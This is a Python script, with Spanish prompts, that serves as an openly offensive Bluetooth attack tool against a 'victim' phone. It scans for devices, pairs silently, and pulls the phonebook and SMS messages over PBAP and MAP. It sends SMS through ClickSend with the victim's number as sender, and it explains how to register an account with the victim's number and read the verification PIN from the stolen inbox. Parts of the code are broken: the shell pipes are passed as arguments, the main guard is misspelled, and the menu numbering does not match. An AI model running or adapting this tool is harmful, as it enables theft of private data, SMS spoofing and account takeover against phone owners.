import os, struct,sys
import subprocess


username        = ''       #Cambiar por propias                                  
api_key         = ''       #Cambiar por propias

import json, subprocess
def send_sms(msg_from,msg_to,msg_body):
    request = { "messages" : [ { "source":"rpi", "from":msg_from, "to":msg_to, "body":msg_body } ] }
    request = json.dumps(request)
    cmd = "curl https://rest.clicksend.com/v3/sms/send -u " + username + ":" + api_key + " -H \"Content-Type: application/json\" -X POST --data-raw '" + request + "'"
    p = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    (output,err) = p.communicate()
    print(output)

def escaneo():
    result = subprocess.run(["ubertooth-scan","-s","hci0","|","grep",":"],capture_output=True)
    result = result.stdout.decode().strip()
    print(result)
def conexion():
    subprocess.run(["bt-agent", "-c","NoInputNoOutput","-d"])
# Pedir variables por pantalla
def obtenerPIN(ruta):
    result = subprocess.run(["cat", ruta,"|","grep","ClickSend"], capture_output=True)
    result = result.stdout.decode().strip()
    print(result)
def obtenerListaNombres(ruta):
    result = subprocess.run(["cat", ruta,"|","grep","name"], capture_output=True)
    result = result.stdout.decode().strip()
    print(result)
def obtenerTelNom(ruta):
    result = subprocess.run(["cat", ruta,"|","grep","TEL;CELL:"], capture_output=True)
    result = result.stdout.decode().strip()
    print(result)
def obtenerTelV(ruta):
    result = subprocess.run(["cat", ruta,"|","grep","TEL;CELL:"], capture_output=True)
    result = result.stdout.decode().strip()
    print(result)
def main():
    
    # Buscar archivo y hacer cat y grep sobre él
    opcion = 0
    while(opcion!=6):
        print("Se va a realizar un escaneo en busca de direcciones MAC")
        escaneo()
        mac = input("Introduce la direccion MAC de la victima: ")
        ruta = input("Introduce el nombre de la carpeta donde se guardaran los datos extraidos: ")
        opcion = input("Que accion desea realizar:\n1-Coger Agenda Telefonica\n2-Coger mensajes enviados/recibidos del dispositivo\n3-Enviar SMS\n4-Obtener PIN ClickSend\n5-Salir\nIntroduce el numero de la accion:")
        opcion = int(opcion)
        conexion()
        if opcion == 1:
            subprocess.run(["sudo","python","pbapclient.py",mac,ruta], capture_output=True)
            print("Este es el listado de los nombres de la agenda telefonica:")
            ruta3 = ruta + "/telecom/pb/listing.xml"
            obtenerListaNombres(ruta3)
            print("Este es el numero de telefono de la victima:")
            rutatelV=ruta + "/telecom/pb/0.vcf"
            obtenerTelV(rutatelV)
            opcion2=1
            while(opcion2==1):
                opcion2 = input("Si desea ver los telefonos de algunos contactos pulse 1:")
                opcion2=int(opcion2)
                if opcion2==1:
                    var6 =input("Introduzca el numero de handle correspondiente al nombre:")
                    ruta4 = ruta + "/telecom/pb/"+var6+".vcf"
                    obtenerTelNom(ruta4)
        elif opcion == 2:
            subprocess.run(["sudo","python","mapclient.py",mac,ruta], capture_output=True)
            print("Si desea ver los mensajes dirigase a la ruta:"+ruta+"/telecom/msg\nAhi habra varias carpeta donde estaran guardados los mensajes enviados,recibidos, en borrador y eliminados ")
        elif opcion ==3:
            print("Si desea usar una cuenta propia de ClickSend tendra que hacer lo siguiente:\n!!IMPORTANTE!!: si desea usar su propia cuenta tendra que hacer la accion 2 de obtener mensajes \n1- Registrarse en la pagina oficial de ClickSend\n2-Cuando le pidan el telefono ponga el de la Victima\n3- Una vez haya puesto el de la victima con la accion 5 del menu principal podra sacar el mensaje que contiene el PIN de verificacion\n4- Cambie las variables de este archivo llamadas username y api_key por las suyas")
            var3 = input("Introduce un numero de telefono del destinatario (Victima Bluetooth): ")
            var4 = input("Introduce el numero del que va a recibir el sms: ")
            var5 = input("Introduce el mensaje que quieres enviar: ")
            send_sms(var3,var4,var5)
        elif opcion == 4:
            print("!!IMPORTANTE!!:Realizar accion 2 primero")
            ruta2 = ruta + "/telecom/msg/inbox/mlisting.xml"
            obtenerPIN(ruta2)
    print("Saliendo...")
    return 0
if _name_ == "_main_":
    sys.exit(main())
